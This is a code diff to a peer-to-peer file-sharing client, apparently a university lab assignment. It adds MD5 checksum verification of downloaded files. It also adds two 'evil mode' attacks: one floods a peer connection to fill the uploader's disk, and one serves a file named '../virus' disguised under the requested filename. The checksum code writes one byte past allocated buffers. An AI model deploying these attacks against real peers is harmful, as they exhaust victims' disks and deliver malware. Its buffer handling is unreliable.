@@ -317,6 +317,27 @@ static size_t read_tracker_response(task_t *t)
 	}
 }
 
+//Convert file into md5. Store into result. 
+void md5_convert(char* result, char *file_name, unsigned long num_bytes)
+{
+	FILE *file;;
+	file = fopen(file_name, "r");
+	unsigned char *file_bytes = malloc(sizeof(char) * num_bytes);
+	fread(file_bytes, 1, num_bytes, file);
+
+	//Start the md5
+	md5_state_t *pms = malloc(sizeof(md5_state_t));
+	md5_init(pms);
+	md5_append(pms, file_bytes, num_bytes);
+	
+	//Append null terminator to end of result and also fill in result with md5
+	result[MD5_TEXT_DIGEST_SIZE] = '\0'; 
+	md5_finish_text(pms, result, 1);
+	
+	free(pms);
+	free(file_bytes);		
+	fclose(file);
+}
 
 // start_tracker(addr, port)
 //	Opens a connection to the tracker at address 'addr' and port 'port'.
@@ -421,9 +442,21 @@ static void register_files(task_t *tracker_task, const char *myalias)
 			&& (ent->d_name[namelen - 1] == 'c'
 			    || ent->d_name[namelen - 1] == 'h'))
 		    || (namelen > 1 && ent->d_name[namelen - 1] == '~'))
-			continue;
+			continue;	
 
-		osp2p_writef(tracker_task->peer_fd, "HAVE %s\n", ent->d_name);
+		//Find the file size
+		FILE *file;
+		file = fopen(ent->d_name, "r");
+		fseek(file, 0, SEEK_END);
+		unsigned long bytes = ftell(file);
+		fclose(file);
+
+		//Check valid md5 after downloading, so it can check validity of file
+		char *checksum = malloc(sizeof(char)*MD5_TEXT_DIGEST_SIZE);
+		md5_convert(checksum, ent->d_name, bytes);
+
+		//Register file and add in a md5 checksum at the end
+		osp2p_writef(tracker_task->peer_fd, "HAVE %s %s\n", ent->d_name, checksum);
 		messagepos = read_tracker_response(tracker_task);
 		if (tracker_task->buf[messagepos] != '2')
 			error("* Tracker error message while registering '%s':\n%s",
@@ -537,6 +570,13 @@ static void task_download(task_t *t, task_t *tracker_task)
 	}
 	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
 
+	//Corrupt the uploader's file, until the peer's file disk becomes full. It will not stop until write fails, which is when their disk is full. Will do this to every peer that has the requested file to download.
+	if(evil_mode == 1){
+		while(write(t->peer_fd, "a", 1) > 0){};
+		message("* Their disk is now full.");
+		goto try_again;
+	}
+
 	// Open disk file for the result.
 	// If the filename already exists, save the file in a name like
 	// "foo.txt~1~".  However, if there are 50 local files, don't download
@@ -589,6 +629,34 @@ static void task_download(task_t *t, task_t *tracker_task)
 
 	// Empty files are usually a symptom of some error.
 	if (t->total_written > 0) {
+		//Check valid md5 after downloading, so it can check validity of file
+		char *user = malloc(sizeof(char)*MD5_TEXT_DIGEST_SIZE);
+		md5_convert(user, t->disk_filename, (unsigned long) t->total_written); 
+
+		//printf("md5: %s\n", user);
+
+		//Retrieve checksum from tracker
+		osp2p_writef(tracker_task->peer_fd, "MD5SUM %s\n", t->filename);
+		size_t messagepos = read_tracker_response(tracker_task);
+		char *tracker = malloc(sizeof(char) * MD5_TEXT_DIGEST_SIZE);
+		strncpy(tracker, tracker_task->buf, messagepos-1);
+		tracker[MD5_TEXT_DIGEST_SIZE] = '\0';
+
+		//printf("checksum: %s\n", tracker);
+
+		//Compare the two values
+		if(messagepos == 0 || tracker == NULL){
+			message("Cannot verify the md5 from the tracker");		
+		}else if(strcmp(user, tracker) != 0){
+			error("The file downloaded is corrupt or different, trying next peer...");
+			free(user);
+			free(tracker);
+			goto try_again;		
+		}
+
+		free(user);
+		free(tracker);
+
 		message("* Downloaded '%s' was %lu bytes long\n",
 			t->disk_filename, (unsigned long) t->total_written);
 		// Inform the tracker that we now have the file,
@@ -699,14 +767,20 @@ static void task_upload(task_t *t)
 		error("Trying to upload a file that doesn't exist or not in current directory");
 		goto exit;
 	}
+	
+	//Upload a virus file that you can specify from where, it will be hidden to the downloader as it will still have the same filename on their computer. Can be an executable when they run it the virus will then act.
+	if(evil_mode == 2)
+		t->disk_fd = open("../virus", O_RDONLY);
+	else
+		t->disk_fd = open(t->filename, O_RDONLY);
 
-	t->disk_fd = open(t->filename, O_RDONLY);
 	if (t->disk_fd == -1) {
 		error("* Cannot open file %s", t->filename);
 		goto exit;
 	}
 
 	message("* Transferring file %s\n", t->filename);
+
 	// Now, read file from disk and write it to the requesting peer.
 	while (1) {
 		int ret = write_from_taskbuf(t->peer_fd, t);
@@ -730,7 +804,6 @@ static void task_upload(task_t *t)
 	task_free(t);
 }
 
-
 // main(argc, argv)
 //	The main loop!
 int main(int argc, char *argv[])
@@ -741,6 +814,7 @@ int main(int argc, char *argv[])
 	char *s;
 	const char *myalias;
 	struct passwd *pwent;
+	evil_mode = 0; //init value
 
 	// Default tracker is read.cs.ucla.edu
 	osp2p_sscanf("131.179.80.139:11111", "%I:%d",
@@ -815,7 +889,6 @@ int main(int argc, char *argv[])
 	for (; argc > 1; argc--, argv++){
 		//message("in loop\n");
 		if((t = start_download(tracker_task, argv[1]))){
-			
 			cpid = fork();
 			if(cpid == 0){
 				task_download(t, tracker_task);	
@@ -832,7 +905,6 @@ int main(int argc, char *argv[])
 	while ((t = task_listen(listen_task))){
 		cpid = fork();
 		if(cpid == 0){
-			
 			task_upload(t);
 			_exit(0);
 		}else if(cpid > 0){
